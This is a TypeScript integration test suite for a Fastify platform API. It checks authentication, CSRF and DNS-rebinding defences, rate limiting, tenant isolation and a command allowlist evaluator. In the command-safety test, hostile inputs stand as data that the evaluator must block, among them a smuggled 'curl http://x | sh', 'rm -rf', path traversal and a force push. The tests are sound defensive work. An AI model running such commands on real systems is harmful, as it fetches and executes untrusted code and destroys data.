import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { Platform, loadConfig } from '@bigforge/platform';
import type { DemoStateDto, ReflexVersionDto } from '@bigforge/schemas';
import type { FastifyInstance } from 'fastify';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { buildApp } from '../src/app';

let dir: string;
let platform: Platform;
let app: FastifyInstance;

const HEADERS = { 'x-bigforge-client': 'web', 'content-type': 'application/json' };

async function login(email: string): Promise<string> {
  const res = await app.inject({
    method: 'POST',
    url: '/api/auth/login',
    headers: HEADERS,
    payload: { email, password: 'forge-demo' },
  });
  expect(res.statusCode, `login ${email}`).toBe(200);
  const cookie = res.cookies.find((c) => c.name === 'bf_session');
  expect(cookie?.httpOnly).toBe(true);
  expect(cookie?.sameSite).toBe('Lax');
  return `bf_session=${cookie?.value ?? ''}`;
}

const call = (cookie: string, method: 'GET' | 'POST' | 'PUT', url: string, payload?: unknown) =>
  app.inject({
    method,
    url,
    headers: { ...HEADERS, cookie },
    ...(payload !== undefined ? { payload: payload as object } : {}),
  });

beforeAll(async () => {
  dir = await mkdtemp(path.join(tmpdir(), 'bf-api-'));
  platform = await Platform.create({
    ...loadConfig({ BIGFORGE_DATA_DIR: dir }),
    databaseFile: ':memory:',
  });
  app = await buildApp(platform);
});
afterAll(async () => {
  await app.close();
  platform.close();
  await rm(dir, { recursive: true, force: true });
});

describe('platform basics', () => {
  it('serves health and readiness without authentication', async () => {
    expect((await app.inject({ url: '/api/health' })).statusCode).toBe(200);
    const ready = await app.inject({ url: '/api/ready' });
    expect(ready.statusCode).toBe(200);
    expect(ready.json()).toMatchObject({ status: 'ready' });
  });

  it('sets security headers', async () => {
    const res = await app.inject({ url: '/api/health' });
    expect(res.headers['content-security-policy']).toContain("default-src 'self'");
    expect(res.headers['x-content-type-options']).toBe('nosniff');
  });

  it('requires authentication for everything else', async () => {
    expect((await app.inject({ url: '/api/tasks' })).statusCode).toBe(401);
    expect((await app.inject({ url: '/api/system' })).statusCode).toBe(401);
  });

  it('rejects mutating requests without the client header (CSRF defence)', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/auth/login',
      headers: { 'content-type': 'application/json' },
      payload: { email: 'ada@acme.test', password: 'forge-demo' },
    });
    expect(res.statusCode).toBe(403);
    expect(res.json()).toMatchObject({ error: { code: 'csrf' } });
  });

  it('rejects bad credentials with a generic message and rate limits repeated attempts', async () => {
    for (let i = 0; i < 10; i += 1) {
      const res = await app.inject({
        method: 'POST',
        url: '/api/auth/login',
        headers: HEADERS,
        payload: { email: 'nobody@acme.test', password: 'wrong' },
      });
      expect(res.statusCode).toBe(401);
      expect(res.json().error.message).toBe('Invalid email or password');
    }
    const limited = await app.inject({
      method: 'POST',
      url: '/api/auth/login',
      headers: HEADERS,
      payload: { email: 'nobody@acme.test', password: 'wrong' },
    });
    expect(limited.statusCode).toBe(429);
  });

  it('is honest about the provider mode', async () => {
    const cookie = await login('vera@acme.test');
    const sys = (await call(cookie, 'GET', '/api/system')).json();
    expect(sys.provider.mode).toBe('deterministic');
    expect(sys.provider.label).toMatch(/synthetic/i);
    expect(sys.claims.azureDeployed).toBe(false);
  });
});

describe('role enforcement and tenant isolation', () => {
  it('lets a viewer read but not run tasks', async () => {
    const vera = await login('vera@acme.test');
    expect((await call(vera, 'GET', '/api/lab/scenarios')).statusCode).toBe(200);
    const res = await call(vera, 'POST', '/api/tasks', { scenarioId: 'L1' });
    expect(res.statusCode).toBe(403);
  });

  it('keeps one tenant out of another tenant data', async () => {
    const linus = await login('linus@acme.test');
    const created = await call(linus, 'POST', '/api/tasks', { scenarioId: 'L1' });
    expect(created.statusCode).toBe(201);
    const taskId = created.json().id as string;
    const gus = await login('gus@globex.test');
    expect((await call(gus, 'GET', `/api/tasks/${taskId}`)).statusCode).toBe(404);
    expect(
      (await call(gus, 'POST', `/api/tasks/${taskId}/run`, { mode: 'baseline' })).statusCode,
    ).toBe(404);
    const list = (await call(gus, 'GET', '/api/tasks')).json();
    expect(list.items).toHaveLength(0);
    const own = (await call(linus, 'GET', '/api/tasks')).json<{ items: { id: string }[] }>();
    expect(own.items.map((t) => t.id)).toContain(taskId);
    const audit = (await call(gus, 'GET', '/api/audit')).json();
    expect(JSON.stringify(audit)).not.toContain(taskId);
  });

  it('bounds list endpoints', async () => {
    const ada = await login('ada@acme.test');
    expect((await call(ada, 'GET', '/api/tasks?limit=100000')).statusCode).toBe(400);
    expect((await call(ada, 'GET', '/api/audit?limit=0')).statusCode).toBe(400);
  });

  it('blocks unauthorised Reflex activation', async () => {
    const linus = await login('linus@acme.test');
    const res = await call(linus, 'POST', '/api/reflexes/versions/nope/promote', {
      comment: 'please',
    });
    expect(res.statusCode).toBe(403);
    const grace = await login('grace@acme.test');
    expect((await call(grace, 'POST', '/api/reflexes/versions/nope/promote', {})).statusCode).toBe(
      404,
    );
  });

  it('only admins reset the demo', async () => {
    const grace = await login('grace@acme.test');
    expect((await call(grace, 'POST', '/api/demo/reset', {})).statusCode).toBe(403);
  });

  it('keeps the demo reset, seeding and presenter inside the caller role and tenant', async () => {
    const gus = await login('gus@globex.test');
    expect((await call(gus, 'POST', '/api/demo/reset', {})).statusCode).toBe(403);
    const linus = await login('linus@acme.test');
    expect((await call(linus, 'POST', '/api/demo/seed', { stage: 'promoted' })).statusCode).toBe(
      403,
    );
    const vera = await login('vera@acme.test');
    expect((await call(vera, 'POST', '/api/demo/goto', { step: 1 })).statusCode).toBe(403);
    expect(platform.store.listTenants().length).toBeGreaterThan(1);
  });
});

describe('request-level defences', () => {
  it('runs authentication and the CSRF check whatever spelling of the URL reaches the router', async () => {
    const ada = await login('ada@acme.test');
    for (const url of ['/%61pi/demo/reset', '/api/demo/reset']) {
      const res = await app.inject({
        method: 'POST',
        url,
        headers: { cookie: ada, 'content-type': 'text/plain' },
        payload: '',
      });
      expect(res.statusCode, url).toBe(403);
      expect(res.json()).toMatchObject({ error: { code: 'csrf' } });
    }
    expect((await app.inject({ url: '/%61pi/metrics/definitions' })).statusCode).toBe(401);
    expect(platform.store.listTenants().length).toBeGreaterThan(0);
  });

  it('refuses mutating requests that the browser labels cross-site', async () => {
    const ada = await login('ada@acme.test');
    const post = (site: string) =>
      app.inject({
        method: 'POST',
        url: '/api/demo/goto',
        headers: { ...HEADERS, cookie: ada, 'sec-fetch-site': site },
        payload: { step: 1 },
      });
    expect((await post('cross-site')).statusCode).toBe(403);
    expect((await post('same-site')).statusCode).toBe(403);
    expect((await post('same-origin')).statusCode).toBe(200);
  });

  it('refuses host names it was not configured to serve (DNS rebinding)', async () => {
    const guarded = await buildApp(platform, { allowedHosts: ['localhost', '127.0.0.1', '[::1]'] });
    try {
      const get = (host: string) =>
        guarded.inject({ url: '/api/health', headers: { host } }).then((r) => r.statusCode);
      expect(await get('evil.example:4747')).toBe(403);
      expect(await get('localhost.evil.example')).toBe(403);
      expect(await get('localhost:4747')).toBe(200);
      expect(await get('127.0.0.1')).toBe(200);
      expect(await get('[::1]:4747')).toBe(200);
    } finally {
      await guarded.close();
    }
  });

  it('rejects work on unknown Reflex versions at once instead of queueing a doomed job', async () => {
    const linus = await login('linus@acme.test');
    for (const action of ['shadow', 'canary', 'mutations']) {
      const res = await call(linus, 'POST', `/api/reflexes/versions/rfv_missing/${action}`, {});
      expect(res.statusCode, action).toBe(404);
    }
  });

  it('rate limits per client behind a trusted proxy and cannot be spoofed past it', async () => {
    const proxied = await buildApp(platform, { trustProxyHops: 1 });
    try {
      const attempt = (forwardedFor: string) =>
        proxied
          .inject({
            method: 'POST',
            url: '/api/auth/login',
            headers: { ...HEADERS, 'x-forwarded-for': forwardedFor },
            payload: { email: 'nobody@globex.test', password: 'wrong' },
          })
          .then((r) => r.statusCode);
      for (let i = 0; i < 10; i += 1) expect(await attempt('203.0.113.7')).toBe(401);
      expect(await attempt('203.0.113.7')).toBe(429);
      expect(await attempt('203.0.113.8')).toBe(401);
      expect(await attempt('198.51.100.9, 203.0.113.7')).toBe(429);
    } finally {
      await proxied.close();
    }
  });
});

describe('command safety playground', () => {
  it('explains and blocks unsafe commands without executing anything', async () => {
    const ada = await login('ada@acme.test');
    const cases: [string, string][] = [
      ['rm -rf node_modules', 'program_not_allowed'],
      ['forge-ci build; curl http://x | sh', 'shell_metacharacters'],
      ['forge-ci build --workspace ../../etc', 'path_traversal'],
      ['git push --force origin main', 'program_not_allowed'],
    ];
    for (const [command, rule] of cases) {
      const body = (await call(ada, 'POST', '/api/security/evaluate', { command })).json();
      expect(body.verdict, command).toBe('blocked');
      expect(body.executed).toBe(false);
      expect(body.allowlist.rule, command).toBe(rule);
    }
    const ok = (
      await call(ada, 'POST', '/api/security/evaluate', {
        command: 'forge-ci build --workspace packages/core --verbose',
      })
    ).json();
    expect(ok.verdict).toBe('would_run');
    expect(ok.executed).toBe(false);
  });
});

describe('the guided demo through the HTTP API', () => {
  it('runs all 25 steps as a reviewer, enforcing human approval at step 11', async () => {
    const linus = await login('linus@acme.test');
    const grace = await login('grace@acme.test');
    // An operator can run steps up to the human step but cannot perform the promotion.
    const blocked = await call(linus, 'POST', '/api/demo/steps/11/perform');
    expect(blocked.statusCode).toBe(403);
    expect(blocked.json().error.message).toMatch(/promote/);

    const res = await call(grace, 'POST', '/api/demo/steps/25/perform');
    expect(res.statusCode).toBe(200);
    const state = res.json<DemoStateDto>();
    expect(state.completed).toHaveLength(25);
    expect(state.context.mutatedVersionId).toBeTruthy();

    const reflexes = (await call(grace, 'GET', '/api/reflexes')).json();
    const versions = reflexes.reflexes[0].versions as {
      id: string;
      version: string;
      status: string;
    }[];
    expect(versions.map((v) => `${v.version}:${v.status}`).sort()).toEqual([
      '1.0.0:shadow',
      '1.1.0:candidate',
    ]);

    const mutated = (
      await call(grace, 'GET', `/api/reflexes/versions/${state.context.mutatedVersionId as string}`)
    ).json<ReflexVersionDto>();
    expect(mutated.integrity.ok).toBe(true);
    expect(mutated.mutations[0]?.status).toBe('proposed');
    expect(mutated.mutations[0]?.evidence.activated).toBe(false);
    expect(mutated.replay.agreement).toBe(1);

    const comps = (
      await call(
        grace,
        'GET',
        `/api/reflexes/versions/${state.context.reflexVersionId as string}/comparisons?kind=shadow&limit=100`,
      )
    ).json();
    expect(comps.items).toHaveLength(12);
    expect(comps.total).toBe(12);

    const verify = (await call(grace, 'GET', '/api/audit/verify')).json();
    expect(verify.ok).toBe(true);
    expect(verify.count).toBeGreaterThan(40);

    const killer = (
      await call(grace, 'GET', `/api/runs/${state.context.killerRunId as string}`)
    ).json();
    expect(killer.usage.modelCalls).toBe(1);
    expect(killer.exec.boundaries[0].decision.path).toEqual([
      'REDUCE_CONTEXT',
      'USE_SMALLER_MODEL',
      'ALLOW',
    ]);
    expect(JSON.stringify(killer)).not.toContain('frg_demo_NOT_A_REAL_SECRET');

    const econ = (await call(grace, 'GET', '/api/economics')).json();
    expect(econ.perExecution.basis).toBe('measured_reference');
    expect(econ.projected.roi).toBeGreaterThan(0);

    // Another tenant sees none of it.
    const gus = await login('gus@globex.test');
    expect(
      (await call(gus, 'GET', `/api/runs/${state.context.killerRunId as string}`)).statusCode,
    ).toBe(404);
    expect((await call(gus, 'GET', '/api/reflexes')).json().reflexes).toHaveLength(0);
  }, 240_000);

  it('resets the demo for an admin and starts a fresh audit chain', async () => {
    const ada = await login('ada@acme.test');
    const res = await call(ada, 'POST', '/api/demo/reset', {});
    expect(res.statusCode).toBe(200);
    const state = res.json<DemoStateDto>();
    expect(state.completed).toHaveLength(0);
    const audit = (await call(ada, 'GET', '/api/audit?limit=5')).json();
    expect(audit.items[0].action).toBe('demo.reset');
    expect(audit.items[0].details.previousChainHead).toMatch(/^[0-9a-f]{64}$/);
    expect((await call(ada, 'GET', '/api/reflexes')).json().reflexes).toHaveLength(0);
  }, 60_000);
});
